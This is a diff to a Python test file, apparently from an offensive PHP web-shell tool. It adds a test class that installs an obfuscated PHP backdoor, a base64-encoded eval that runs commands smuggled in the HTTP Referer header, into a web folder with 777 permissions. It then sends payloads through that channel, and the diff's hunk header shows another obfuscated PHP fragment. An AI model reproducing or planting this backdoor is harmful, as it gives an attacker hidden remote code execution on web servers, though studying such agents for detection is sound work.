@@ -146,3 +146,77 @@ $sify = $fyqt('', $apod($toja("eo", "", $dqlt.$tylz.$xcrd.$lspg))); $sify();
 
     def test_100_1000_requests(self):
         self._incremental_requests(100, 1000, 10, 20)
+
+@unittest.skipIf(
+    not test_stress_channels,
+    "Test only default generator agent")
+class LegacyReferrerChannel(BaseTest):
+
+    def setUp(self):
+        self.channel = Channel(self.url, self.password, 'LegacyReferrer')
+
+    def _incremental_requests(
+            self,
+            size_start,
+            size_to,
+            step_rand_start,
+            step_rand_to):
+
+        for i in range(size_start, size_to, random.randint(step_rand_start, step_rand_to)):
+            payload = utils.strings.randstr(i)
+            self.assertEqual(
+                self.channel.send(
+                    'echo("%s");' %
+                    payload)[0],
+                payload)
+
+    @classmethod
+    def setUpClass(cls):
+
+        if config.debug:
+            stream_handler.setLevel(logging.DEBUG)
+        else:
+            stream_handler.setLevel(logging.INFO)
+
+        cls._randomize_bd()
+        cls.password = 'asdasd'
+
+        # Check `config.script_folder` permissions
+        if (
+            subprocess.check_output(
+                config.cmd_env_stat_permissions_s % (config.script_folder),
+                shell=True).strip()
+            != config.script_folder_expected_perms
+            ):
+            raise DevException(
+                "Error: give to the http user full permissions to the folder \'%s\'"
+                % config.script_folder
+            )
+
+        obfuscated = """<?php eval(base64_decode('cGFyc2Vfc3RyKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSwkYSk7IGlmKHJlc2V0KCRhKT09J2FzJyAmJiBjb3VudCgkYSk9PTkpIHsgZWNobyAnPGRhc2Q+JztldmFsKGJhc2U2NF9kZWNvZGUoc3RyX3JlcGxhY2UoIiAiLCAiKyIsIGpvaW4oYXJyYXlfc2xpY2UoJGEsY291bnQoJGEpLTMpKSkpKTtlY2hvICc8L2Rhc2Q+Jzt9')); ?>"""
+
+        tmp_handler, tmp_path = tempfile.mkstemp()
+        save_generated(obfuscated, tmp_path)
+        subprocess.check_call(
+            config.cmd_env_move_s_s % (tmp_path, cls.path),
+            shell=True)
+
+        subprocess.check_call(
+            config.cmd_env_chmod_s_s % ('777', cls.path),
+            shell=True)
+
+    @classmethod
+    def tearDownClass(cls):
+
+        # Check the agent presence, could be already deleted
+        if os.path.isfile(cls.path):
+            subprocess.check_call(
+                config.cmd_env_remove_s % cls.path,
+                shell=True
+            )
+
+    def test_1_100_requests(self):
+        self._incremental_requests(1, 100, 1, 2)
+
+    def test_100_1000_requests(self):
+        self._incremental_requests(100, 1000, 10, 20)
